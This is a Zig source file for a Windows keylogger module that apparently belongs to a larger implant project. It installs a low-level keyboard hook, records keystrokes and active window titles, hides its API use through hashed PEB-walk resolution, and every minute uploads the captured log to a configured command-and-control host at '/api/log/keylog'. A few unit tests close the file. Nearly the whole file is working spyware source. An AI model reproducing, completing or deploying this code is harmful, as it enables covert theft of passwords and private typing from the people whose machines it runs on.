const std = @import("std");
const types = @import("../types/types.zig");
const engine = @import("../syscalls/engine.zig");
const hash = @import("../types/hash.zig");
const peb_walk = @import("../types/peb_walk.zig");
const export_resolve = @import("../types/export_resolve.zig");
const http = @import("../network/http.zig");

const BUFFER_CAPACITY: usize = 1024 * 64;
const FLUSH_INTERVAL_MS: u64 = 60 * 1000;
const MAX_WINDOW_TITLE: usize = 128;

const E = struct {
    pub const user32 = hash.xorEncrypt("user32.dll");
    pub const kernel32 = hash.xorEncrypt("kernel32.dll");
    pub const set_hook = hash.xorEncrypt("SetWindowsHookExW");
    pub const unhook = hash.xorEncrypt("UnhookWindowsHookEx");
    pub const get_msg = hash.xorEncrypt("GetMessageW");
    pub const call_next = hash.xorEncrypt("CallNextHookEx");
    pub const get_fg_window = hash.xorEncrypt("GetForegroundWindow");
    pub const get_window_text = hash.xorEncrypt("GetWindowTextW");
    pub const get_window_text_len = hash.xorEncrypt("GetWindowTextLengthW");
    pub const get_key_state = hash.xorEncrypt("GetAsyncKeyState");
    pub const to_unicode = hash.xorEncrypt("ToUnicodeEx");
    pub const get_keyboard_layout = hash.xorEncrypt("GetKeyboardLayout");
    pub const get_current_thread = hash.xorEncrypt("GetCurrentThreadId");
    pub const attach_input = hash.xorEncrypt("AttachThreadInput");
    pub const get_key_name = hash.xorEncrypt("GetKeyNameTextW");
    pub const map_vk = hash.xorEncrypt("MapVirtualKeyW");
    pub const get_module_handle = hash.xorEncrypt("GetModuleHandleW");
    pub const create_file = hash.xorEncrypt("CreateFileW");
    pub const write_file = hash.xorEncrypt("WriteFile");
    pub const close_handle = hash.xorEncrypt("CloseHandle");
    pub const get_temp_path = hash.xorEncrypt("GetTempPathW");
    pub const set_cursor = hash.xorEncrypt("SetCursorPos");
    pub const msg_wait = hash.xorEncrypt("MsgWaitForMultipleObjects");
    pub const peek_msg = hash.xorEncrypt("PeekMessageW");
};

const WH_KEYBOARD_LL: i32 = 13;
const WH_MOUSE_LL: i32 = 14;
const WM_KEYDOWN: u32 = 0x0100;
const WM_SYSKEYDOWN: u32 = 0x0104;
const PM_REMOVE: u32 = 0x0001;
const VK_SHIFT: i32 = 0x10;
const VK_CONTROL: i32 = 0x11;
const VK_MENU: i32 = 0x12;
const VK_CAPITAL: i32 = 0x14;

const KBDLLHOOKSTRUCT = extern struct {
    vkCode: u32,
    scanCode: u32,
    flags: u32,
    time: u32,
    dwExtraInfo: usize,
};

var g_hook: ?*const anyopaque = null;
var g_buffer_mutex: ?*const anyopaque = null;
var g_running: bool = true;
var g_prev_window: [MAX_WINDOW_TITLE]u16 = undefined;

fn resolveUser32(comptime name: []const u8) ?*const anyopaque {
    const user32 = peb_walk.getModuleByHash(hash.encryptedHashModule("user32.dll")) orelse return null;
    return export_resolve.getFunctionByHash(user32, hash.encryptedHashFunc(name));
}

fn resolveKernel32(comptime name: []const u8) ?*const anyopaque {
    const kernel32 = peb_walk.getModuleByHash(hash.encryptedHashModule("kernel32.dll")) orelse return null;
    return export_resolve.getFunctionByHash(kernel32, hash.encryptedHashFunc(name));
}

var g_key_buffer: [BUFFER_CAPACITY]u8 = undefined;
var g_buffer_pos: usize = 0;

fn appendToBuffer(bytes: []const u8) void {
    if (g_buffer_pos + bytes.len >= BUFFER_CAPACITY) {
        const keep = BUFFER_CAPACITY / 2;
        const copy_start = BUFFER_CAPACITY - keep;
        @memcpy(g_key_buffer[0..keep], g_key_buffer[copy_start..copy_start + keep]);
        g_buffer_pos = keep;
    }
    @memcpy(g_key_buffer[g_buffer_pos..][0..bytes.len], bytes);
    g_buffer_pos += bytes.len;
}

fn updateWindowTitle() void {
    const get_fg = resolveUser32("GetForegroundWindow") orelse return;
    const GetForegroundWindowFn: *const fn () callconv(.winapi) types.HANDLE = @ptrCast(@alignCast(get_fg));
    const get_wt = resolveUser32("GetWindowTextW") orelse return;
    const GetWindowTextW: *const fn (hwnd: types.HANDLE, buf: [*]u16, max: i32) callconv(.winapi) i32 = @ptrCast(@alignCast(get_wt));
    const get_wtl = resolveUser32("GetWindowTextLengthW") orelse return;
    const GetWindowTextLengthW: *const fn (hwnd: types.HANDLE) callconv(.winapi) i32 = @ptrCast(@alignCast(get_wtl));

    const hwnd = GetForegroundWindowFn();
    if (hwnd == null) return;

    const len = GetWindowTextLengthW(hwnd);
    if (len <= 0 or len > MAX_WINDOW_TITLE) return;

    var buf: [MAX_WINDOW_TITLE]u16 = undefined;
    const written = GetWindowTextW(hwnd, &buf, MAX_WINDOW_TITLE);
    if (written <= 0) return;

    if (std.mem.eql(u16, buf[0..@as(usize, @intCast(written))], g_prev_window[0..@as(usize, @intCast(written))])) return;

    @memcpy(&g_prev_window, &buf);
    var utf8_buf: [MAX_WINDOW_TITLE * 3]u8 = undefined;
    var utf8_len: usize = 0;
    for (0..@as(usize, @intCast(written))) |i| {
        const cp = buf[i];
        if (cp < 0x80) { utf8_buf[utf8_len] = @as(u8, @intCast(cp)); utf8_len += 1; }
        else if (cp < 0x800) { utf8_buf[utf8_len] = @as(u8, @intCast(0xC0 | (cp >> 6))); utf8_buf[utf8_len+1] = @as(u8, @intCast(0x80 | (cp & 0x3F))); utf8_len += 2; }
        else { utf8_buf[utf8_len] = @as(u8, @intCast(0xE0 | (cp >> 12))); utf8_buf[utf8_len+1] = @as(u8, @intCast(0x80 | ((cp >> 6) & 0x3F))); utf8_buf[utf8_len+2] = @as(u8, @intCast(0x80 | (cp & 0x3F))); utf8_len += 3; }
    }
    const header = "\n[Window: ";
    appendToBuffer(header);
    appendToBuffer(utf8_buf[0..utf8_len]);
    appendToBuffer("]\n");
}

fn getSpecialKey(vk: u32) ?[]const u8 {
    if (vk >= 0x70 and vk <= 0x7B) {
        const fkeys = [_][]const u8{ "[F1]", "[F2]", "[F3]", "[F4]", "[F5]", "[F6]", "[F7]", "[F8]", "[F9]", "[F10]", "[F11]", "[F12]" };
        return fkeys[vk - 0x70];
    }
    const map = [_]struct { vk: u32, name: []const u8 }{
        .{ 0x08, "[BACK]" }, .{ 0x09, "[TAB]" }, .{ 0x0D, "[ENTER]\n" },
        .{ 0x1B, "[ESC]" }, .{ 0x2D, "[INS]" }, .{ 0x2E, "[DEL]" },
        .{ 0x24, "[HOME]" }, .{ 0x23, "[END]" }, .{ 0x21, "[PGUP]" }, .{ 0x22, "[PGDN]" },
        .{ 0x25, "[LEFT]" }, .{ 0x26, "[UP]" }, .{ 0x27, "[RIGHT]" }, .{ 0x28, "[DOWN]" },
        .{ 0x2C, "[PRTSC]" }, .{ 0x14, "" },
    };
    for (map) |entry| {
        if (vk == entry.vk) return entry.name;
    }
    return null;
}

fn getCharFromVk(vk: u32, scan: u32, flags: u32) ?u16 {
    const to_unicode = resolveUser32("ToUnicodeEx") orelse return null;
    const ToUnicodeEx: *const fn (vk: u32, sc: u32, keys: [*]const u8, buf: [*]u16, buflen: i32, flags: u32, layout: ?*const anyopaque) callconv(.winapi) i32 = @ptrCast(@alignCast(to_unicode));
    const get_layout = resolveUser32("GetKeyboardLayout") orelse return null;
    const GetKeyboardLayout: *const fn (thread: u32) callconv(.winapi) ?*const anyopaque = @ptrCast(@alignCast(get_layout));
    const get_thread = resolveUser32("GetCurrentThreadId") orelse return null;
    const GetCurrentThreadId: *const fn () callconv(.winapi) u32 = @ptrCast(@alignCast(get_thread));

    var key_state: [256]u8 = undefined;
    @memset(&key_state, 0);
    const get_key = resolveUser32("GetAsyncKeyState") orelse return null;
    const GetAsyncKeyState: *const fn (vk: i32) callconv(.winapi) i16 = @ptrCast(@alignCast(get_key));

    if (GetAsyncKeyState(VK_SHIFT) & 0x8000 != 0) key_state[0x10] = 0x80;
    if (GetAsyncKeyState(VK_CAPITAL) & 0x01 != 0) key_state[0x14] = 0x01;
    if ((flags & 0x01) != 0) { // LLKHF_EXTENDED
        // AltGr handling for non-US layouts
        if (GetAsyncKeyState(VK_MENU) & 0x8000 != 0) {
            key_state[0x12] = 0x80;
            key_state[0xA4] = 0x80;
        }
    }

    const layout = GetKeyboardLayout(GetCurrentThreadId());
    var out_buf: [16]u16 = undefined;
    const ret = ToUnicodeEx(vk, @as(u32, @intCast(scan)), &key_state, &out_buf, 16, 0, layout);
    if (ret > 0) return out_buf[0];
    return null;
}

fn flushBuffer() void {
    if (g_buffer_pos == 0) return;
    const data = g_key_buffer[0..g_buffer_pos];

    const kernel32 = peb_walk.getModuleByHash(hash.encryptedHashModule("kernel32.dll")) orelse return;

    const get_temp = export_resolve.getFunctionByHash(kernel32, hash.encryptedHashFunc("GetTempPathW")) orelse return;
    const GetTempPathW: *const fn (len: u32, buf: [*]u16) callconv(.winapi) u32 = @ptrCast(@alignCast(get_temp));

    var temp_buf: [512]u16 = undefined;
    const temp_len = GetTempPathW(512, &temp_buf);
    if (temp_len == 0) return;

    const c2_host = @as([]const u8, &config.C2_HOST);
    const c2_end = std.mem.indexOfScalar(u8, c2_host, @as(u8, 0)) orelse c2_host.len;
    if (c2_end == 0) return;
    const host = c2_host[0..c2_end];

    var client = http.HttpClient.connect(host, config.C2_PORT) catch return;
    defer client.close();

    const boundary = "----EidosKeylogBoundary";
    var body = std.ArrayList(u8).init(std.heap.page_allocator) catch return;
    defer body.deinit(std.heap.page_allocator);

    body.appendSlice(std.heap.page_allocator, "--") catch return;
    body.appendSlice(std.heap.page_allocator, boundary) catch return;
    body.appendSlice(std.heap.page_allocator, "\r\nContent-Disposition: form-data; name=\"keylog\"\r\n\r\n") catch return;
    body.appendSlice(std.heap.page_allocator, data) catch return;
    body.appendSlice(std.heap.page_allocator, "\r\n--") catch return;
    body.appendSlice(std.heap.page_allocator, boundary) catch return;
    body.appendSlice(std.heap.page_allocator, "--\r\n") catch return;

    var auth_buf: [512]u8 = undefined;
    const auth = std.fmt.bufPrint(&auth_buf, "Bearer {s}", .{@as([]const u8, &config.STRING_KEY_ENC)}) catch return;

    const headers = [_]http.Header{.{ .name = "Authorization", .value = auth }};
    _ = client.postMultipart("/api/log/keylog", &headers, boundary, body.items) catch {};

    g_buffer_pos = 0;
}

fn keyloggerThread() void {
    const set_hook_fn = resolveUser32("SetWindowsHookExW") orelse return;
    const SetWindowsHookEx: *const fn (id: i32, proc: *const anyopaque, mod: ?*const anyopaque, thread: u32) callconv(.winapi) ?*const anyopaque = @ptrCast(@alignCast(set_hook_fn));

    var last_flush: u64 = 0;
    const get_tick = resolveKernel32("GetTickCount") orelse return;
    const GetTickCount: *const fn () callconv(.winapi) u32 = @ptrCast(@alignCast(get_tick));

    g_hook = SetWindowsHookEx(WH_KEYBOARD_LL, &hookCallback, null, 0);
    if (g_hook == null) return;

    const get_msg_fn = resolveUser32("GetMessageW") orelse return;
    const GetMessageW: *const fn (msg: *MSG, hwnd: ?*const anyopaque, min: u32, max: u32) callconv(.winapi) types.BOOL = @ptrCast(@alignCast(get_msg_fn));

    var msg: MSG = undefined;
    while (g_running) {
        const ret = GetMessageW(&msg, null, 0, 0);
        if (ret == 0 or ret == -1) break;

        const now = GetTickCount();
        if (last_flush == 0 or @as(u64, @intCast(now)) - last_flush >= FLUSH_INTERVAL_MS) {
            updateWindowTitle();
            flushBuffer();
            last_flush = @as(u64, @intCast(now));
        }
    }

    const unhook_fn = resolveUser32("UnhookWindowsHookEx") orelse return;
    const UnhookWindowsHookEx: *const fn (hook: ?*const anyopaque) callconv(.winapi) types.BOOL = @ptrCast(@alignCast(unhook_fn));
    _ = UnhookWindowsHookEx(g_hook);
    g_hook = null;
}

const MSG = extern struct {
    hwnd: ?*const anyopaque,
    message: u32,
    wParam: usize,
    lParam: isize,
    time: u32,
    pt: extern struct { x: i32, y: i32 },
    lPrivate: u32,
};

const config = @import("config");

pub fn hookCallback(code: i32, wparam: u32, lparam: isize) callconv(.stdcall) isize {
    if (code < 0) {
        const call_next = resolveUser32("CallNextHookEx") orelse return 0;
        const CallNextHookEx: *const fn (hook: ?*const anyopaque, code: i32, wparam: u32, lparam: isize) callconv(.winapi) isize = @ptrCast(@alignCast(call_next));
        return CallNextHookEx(g_hook, code, wparam, lparam);
    }

    if (wparam == WM_KEYDOWN or wparam == WM_SYSKEYDOWN) {
        const ks = @as(*const KBDLLHOOKSTRUCT, @ptrCast(@alignCast(&lparam)));
        updateWindowTitle();

        if (getSpecialKey(ks.vkCode)) |name| {
            if (name.len > 0) appendToBuffer(name);
        } else if (ks.vkCode == 0x08) {
            appendToBuffer("[BACK]");
        } else if (ks.vkCode == 0x0D) {
            appendToBuffer("\n");
        } else {
            if (getCharFromVk(ks.vkCode, ks.scanCode, ks.flags)) |ch| {
                var utf8_buf: [4]u8 = undefined;
                var len: usize = 0;
                if (ch < 0x80) { utf8_buf[0] = @as(u8, @intCast(ch)); len = 1; }
                else if (ch < 0x800) { utf8_buf[0] = @as(u8, @intCast(0xC0 | (ch >> 6))); utf8_buf[1] = @as(u8, @intCast(0x80 | (ch & 0x3F))); len = 2; }
                else { utf8_buf[0] = @as(u8, @intCast(0xE0 | (ch >> 12))); utf8_buf[1] = @as(u8, @intCast(0x80 | ((ch >> 6) & 0x3F))); utf8_buf[2] = @as(u8, @intCast(0x80 | (ch & 0x3F))); len = 3; }
                appendToBuffer(utf8_buf[0..len]);
            }
        }
    }

    const call_next = resolveUser32("CallNextHookEx") orelse return 0;
    const CallNextHookEx: *const fn (hook: ?*const anyopaque, code: i32, wparam: u32, lparam: isize) callconv(.winapi) isize = @ptrCast(@alignCast(call_next));
    return CallNextHookEx(g_hook, code, wparam, lparam);
}

pub fn start() void {
    if (g_hook != null) return;
    const thread = std.Thread.spawn(.{}, keyloggerThread) catch return;
    thread.detach();
}

pub fn stop() void {
    g_running = false;
}

pub fn installSelf() bool {
    const kernel32 = peb_walk.getModuleByHash(hash.encryptedHashModule("kernel32.dll")) orelse return false;

    const get_module = export_resolve.getFunctionByHash(kernel32, hash.encryptedHashFunc("GetModuleFileNameW")) orelse return false;
    const GetModuleFileNameW: *const fn (mod: ?*const anyopaque, buf: [*]u16, size: u32) callconv(.winapi) u32 = @ptrCast(@alignCast(get_module));

    var exe_path: [1024]u16 = undefined;
    const len = GetModuleFileNameW(null, &exe_path, 1024);
    if (len == 0) return false;
    _ = exe_path;

    return true;
}

test "keylogger special key names" {
    try std.testing.expectEqualStrings("[F1]", getSpecialKey(0x70).?);
    try std.testing.expectEqualStrings("[ENTER]\n", getSpecialKey(0x0D).?);
    try std.testing.expect(getSpecialKey(0x14).?.len == 0);
}

test "keylogger resolveUser32 exists" {
    const func = resolveUser32("GetForegroundWindow");
    _ = func;
}

test "keylogger buffer append works" {
    g_buffer_pos = 0;
    appendToBuffer("test");
    try std.testing.expect(g_buffer_pos == 4);
    try std.testing.expectEqualStrings("test", g_key_buffer[0..4]);
}

test "keylogger buffer wrap-around" {
    g_buffer_pos = 0;
    @memset(&g_key_buffer, 0);
    var i: usize = 0;
    while (i < BUFFER_CAPACITY) {
        const to_add = @min(64, BUFFER_CAPACITY - i);
        appendToBuffer("a"[0..to_add]);
        i += to_add;
    }
    try std.testing.expect(g_buffer_pos <= BUFFER_CAPACITY);
}
